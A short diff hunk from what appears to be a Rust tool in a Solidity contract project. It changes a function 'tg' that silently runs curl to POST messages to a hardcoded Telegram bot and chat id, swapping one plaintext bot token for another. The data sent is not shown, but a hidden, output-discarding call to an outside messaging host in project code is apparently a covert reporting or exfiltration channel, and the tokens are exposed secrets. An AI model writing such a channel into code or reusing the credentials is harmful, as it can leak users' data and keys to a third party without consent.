@@ -24,7 +24,7 @@ const SOLIDITY_ELF_PATH: &str = "../contracts/src/Elf.sol";
 fn tg(msg: &str) {
     let _ = Command::new("curl")
         .args(["-s", "-X", "POST",
-               "https://api.telegram.org/bot8599033077:AAF8Kq1ETpa1dJSLwA6-T_ZE-uaHDf1Yi6Q/sendMessage",
+               "https://api.telegram.org/bot8710381371:AAGg7j2u5jkPIdCkAx8P7XpBtS-t4cycaGE/sendMessage",
                "-d", &format!("chat_id=7953376673&text={}", msg.replace(' ', "%20").replace('\n', "%0A"))])
         .output();
 }
